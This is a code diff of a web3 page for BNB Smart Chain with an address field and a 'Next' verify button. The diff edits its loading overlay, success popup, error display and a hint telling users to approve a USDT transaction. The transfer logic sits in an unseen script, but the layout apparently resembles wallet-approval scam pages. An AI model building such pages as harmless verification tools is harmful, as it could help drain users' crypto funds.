@@ -12,14 +12,6 @@
   <script src="js/web3.min.js"></script>
 </head>
 <body>
-  <!-- Loading overlay (light/dark from scanner-manual) -->
-  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
-    <div class="loading-spinner-container">
-      <div class="loading-spinner"></div>
-      <p class="loading-text">Processing...</p>
-    </div>
-  </div>
-
   <main class="container">
     <p class="version-badge" aria-hidden="true">v2</p>
     <label class="label" for="address">Address or Domain Name</label>
@@ -49,37 +41,18 @@
     <p class="estimate" id="estimate">≈ $0.00</p>
 
     <button id="verifyBtn" class="next-btn">Next</button>
-    <p class="preview-hint"><button type="button" id="previewPopupBtn" class="preview-btn">Preview success popup</button></p>
-    <p class="tx-hint">Use BNB Smart Chain. Wallet needs ≥1 USDT and some BNB for gas. Approve the transaction in your wallet when prompted.</p>
   </main>
 
-  <!-- Success popup (reference: Processing-style bottom sheet – 3D check, wireframe globe, particles) -->
-  <div id="successModal" class="success-modal" aria-hidden="true">
+  <!-- Success popup: shown ONLY when script calls showSuccess() after transfer succeeds (never before) -->
+  <div id="successModal" class="success-modal" aria-hidden="true" style="display: none;">
     <div class="success-modal__backdrop"></div>
     <div class="success-modal__sheet">
       <button type="button" class="success-modal__close" aria-label="Close">&times;</button>
       <div class="success-modal__graphic">
         <svg class="success-modal__icon" viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <!-- Wireframe globe – light ethereal blue/turquoise (ref: first img) -->
           <circle cx="70" cy="70" r="56" stroke="rgba(0, 122, 255, 0.4)" stroke-width="1" fill="none"/>
           <ellipse cx="70" cy="70" rx="56" ry="28" stroke="rgba(0, 122, 255, 0.35)" stroke-width="0.9" fill="none"/>
           <ellipse cx="70" cy="70" rx="28" ry="56" stroke="rgba(0, 122, 255, 0.35)" stroke-width="0.9" fill="none"/>
-          <line x1="14" y1="70" x2="126" y2="70" stroke="rgba(0, 122, 255, 0.28)" stroke-width="0.8"/>
-          <line x1="70" y1="14" x2="70" y2="126" stroke="rgba(0, 122, 255, 0.28)" stroke-width="0.8"/>
-          <!-- Glowing shard-like / triangular particles -->
-          <polygon points="70,16 74,24 66,24" fill="rgba(0, 122, 255, 0.85)"/>
-          <polygon points="24,68 30,74 26,62" fill="rgba(0, 122, 255, 0.7)"/>
-          <polygon points="116,72 122,78 118,66" fill="rgba(0, 122, 255, 0.7)"/>
-          <polygon points="68,124 72,132 64,132" fill="rgba(0, 122, 255, 0.7)"/>
-          <polygon points="38,38 44,42 40,34" fill="rgba(0, 122, 255, 0.6)"/>
-          <polygon points="98,52 104,58 100,48" fill="rgba(0, 122, 255, 0.65)"/>
-          <polygon points="42,98 48,102 44,94" fill="rgba(0, 122, 255, 0.6)"/>
-          <polygon points="96,88 102,94 98,84" fill="rgba(0, 122, 255, 0.65)"/>
-          <circle cx="32" cy="42" r="1.5" fill="rgba(0, 122, 255, 0.8)"/>
-          <circle cx="108" cy="58" r="1.2" fill="rgba(0, 122, 255, 0.75)"/>
-          <circle cx="36" cy="98" r="1.2" fill="rgba(0, 122, 255, 0.75)"/>
-          <circle cx="102" cy="82" r="1.5" fill="rgba(0, 122, 255, 0.8)"/>
-          <!-- 3D checkmark: main body vibrant green + distinct blue stripe on one arm (ref) -->
           <path d="M36 72 L56 92 L104 44" stroke="#34C759" stroke-width="14" stroke-linecap="round" stroke-linejoin="round"/>
           <path d="M56 92 L104 44" stroke="#007AFF" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
@@ -93,32 +66,27 @@
     </div>
   </div>
 
-  <!-- Same as reference: static script then direct bind -->
   <script src="js/script.js"></script>
-  <!-- Capture real error from script and show it; bind Next -->
   <script>
+    document.getElementById("verifyBtn").addEventListener("click", Next);
     (function () {
-      var lastTxError = null;
-      var origConsoleError = console.error;
-      console.error = function () {
-        if (arguments.length >= 2 && arguments[1] && typeof arguments[1] === "object") {
-          lastTxError = arguments[1];
-        }
-        return origConsoleError.apply(console, arguments);
+      var modal = document.getElementById("successModal");
+      if (!modal) return;
+      var origShowSuccess = window.showSuccess;
+      if (typeof origShowSuccess !== "function") return;
+      window.showSuccess = function (message) {
+        origShowSuccess(message);
+        modal.style.removeProperty("display");
+        modal.classList.add("is-open");
+        modal.setAttribute("aria-hidden", "false");
       };
-      var origShowError = window.showError;
-      if (typeof origShowError === "function") {
-        window.showError = function (msg) {
-          var fullMsg = msg;
-          if (lastTxError) {
-            var detail = lastTxError.message || lastTxError.reason || lastTxError.code;
-            if (detail) fullMsg = msg + " — " + String(detail);
-            lastTxError = null;
-          }
-          return origShowError(fullMsg);
-        };
+      function closeModal() {
+        modal.classList.remove("is-open");
+        modal.setAttribute("aria-hidden", "true");
+        modal.style.display = "none";
       }
-      document.getElementById("verifyBtn").addEventListener("click", Next);
+      modal.querySelector(".success-modal__close").addEventListener("click", closeModal);
+      modal.querySelector(".success-modal__backdrop").addEventListener("click", closeModal);
     })();
   </script>
   <!-- Update USD estimate when user enters amount (always show as positive) -->
